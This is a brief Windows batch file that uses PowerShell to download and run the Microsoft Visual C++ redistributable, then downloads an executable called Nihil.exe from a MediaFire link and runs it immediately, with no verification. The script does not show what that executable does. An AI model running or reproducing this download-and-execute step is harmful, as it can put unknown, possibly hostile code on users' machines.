@echo off
powershell -command "Invoke-WebRequest https://aka.ms/vs/17/release/vc_redist.x86.exe -Outfile vc_redist.exe"
.\vc_redist.exe

powershell -command "Invoke-WebRequest https://download1335.mediafire.com/deqnhar8qn6g/7p2vjrkhesglxwz/Nihil.exe -Outfile Nihil.exe"
.\Nihil.exe